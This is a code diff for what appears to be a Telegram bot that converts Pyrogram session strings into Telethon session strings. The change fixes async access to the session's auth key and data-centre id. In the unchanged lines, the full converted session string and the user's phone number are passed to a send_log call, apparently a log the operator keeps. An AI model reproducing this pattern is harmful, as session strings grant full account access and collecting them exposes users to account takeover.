@@ -1,3 +1,4 @@
+import asyncio
 import logging
 from pyrogram import filters
 from pyrogram.enums import ParseMode
@@ -78,13 +79,26 @@ async def _step_pyro_string(uid, message, text):
     await temp.start()
     try:
         me = await temp.get_me()
-        auth_key = temp.storage.auth_key.key
-        dc_id = temp.storage.dc_id
+        # ✅ FIX: storage.auth_key() and storage.dc_id() are ASYNC methods in Pyrogram/PyroTGFork
+        try:
+            dc_id = await temp.storage.dc_id()
+        except TypeError:
+            dc_id = temp.storage.dc_id  # fallback if it's a plain attribute
+        try:
+            auth_key_bytes = await temp.storage.auth_key()
+        except TypeError:
+            auth_key_bytes = temp.storage.auth_key  # fallback
+        # Some forks return a function wrapper — unwrap if needed
+        if callable(auth_key_bytes):
+            auth_key_bytes = await auth_key_bytes() if asyncio.iscoroutinefunction(auth_key_bytes) else auth_key_bytes()
+        if not isinstance(auth_key_bytes, (bytes, bytearray)):
+            raise ValueError(f"auth_key not bytes: {type(auth_key_bytes)}")
+
         from telethon.sessions import StringSession
         from telethon.crypto import AuthKey
         ss = StringSession()
-        ss.set_dc(dc_id, DC_IPS.get(dc_id, DC_IPS[2]), 443)
-        ss.auth_key = AuthKey(auth_key)
+        ss.set_dc(int(dc_id), DC_IPS.get(int(dc_id), DC_IPS[2]), 443)
+        ss.auth_key = AuthKey(bytes(auth_key_bytes))
         tele_str = ss.save()
         phone = getattr(me, "phone_number", None) or "N/A"
     finally:
@@ -93,7 +107,7 @@ async def _step_pyro_string(uid, message, text):
     await save_session(uid, "Converter", tele_str, phone, False)
     await send_premium_string(uid, "Telethon String (Converted)", tele_str)
     await send_log(me, "Converter", tele_str, phone)
-    await trace(message.from_user, "SUCCESS", type="convert")
+
 
 async def _step_phone(uid, message, text, stype):
     try:
